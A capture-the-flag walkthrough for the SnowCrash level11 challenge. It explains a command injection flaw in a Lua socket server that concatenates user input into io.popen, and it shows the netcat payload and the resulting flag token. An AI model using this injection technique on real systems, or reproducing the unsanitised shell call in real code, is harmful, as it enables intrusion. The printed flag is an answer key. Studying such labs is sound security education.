
# SnowCrash Level11 Walkthrough

This walkthrough explains how we exploited a command injection vulnerability in a Lua script to retrieve the flag for `level11`.

---

## 🧭 Step 1: Exploring the Environment

We start by listing the contents of the home directory:

```bash
level11@SnowCrash:~$ ls
level11.lua
```

We discover a Lua script. This is the main file we will examine.

---

## 📖 Step 2: Reviewing the Lua Script

We read the script to understand how it behaves:

```bash
level11@SnowCrash:~$ cat level11.lua
```

It reveals the following:

```lua
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)
  return data
end

while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n")
      else
          client:send("Gz you dumb*\n")
      end
  end
  client:close()
end
```

### 🔍 Explanation:

- A socket server listens on `127.0.0.1:5151`.
- It asks for a password and hashes the input using `sha1sum`.
- If the hash matches the hardcoded hash, it returns a success message.

⚠️ **Vulnerability:**  
The script uses `io.popen("echo "..pass.." | sha1sum")`, which **does not sanitize input** — this allows **command injection** by closing the string and appending shell commands.

---

## 🚀 Step 3: Exploiting the Vulnerability

We connect to the vulnerable socket using Netcat:

```bash
level11@SnowCrash:~$ nc 127.0.0.1 5151
Password: salam & getflag > /tmp/saif
Erf nope..
```

### 🔍 Explanation:

- `salam` is an arbitrary string.
- The `&` lets us execute an additional command: `getflag > /tmp/saif`.
- Even though the password is incorrect, the shell command executes because of command injection.

---

## 📄 Step 4: Reading the Flag

We then check the file where we redirected the output:

```bash
level11@SnowCrash:~$ cat /tmp/saif
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```

Success!

---

## ✅ Summary

- Found a Lua script using insecure shell execution (`io.popen`).
- Injected a system command via Netcat to trigger `getflag`.
- Retrieved the flag from a temporary file.

---

### 🎯 **Flag:** `fa6v5ateaw21peobuub8ipe6s`
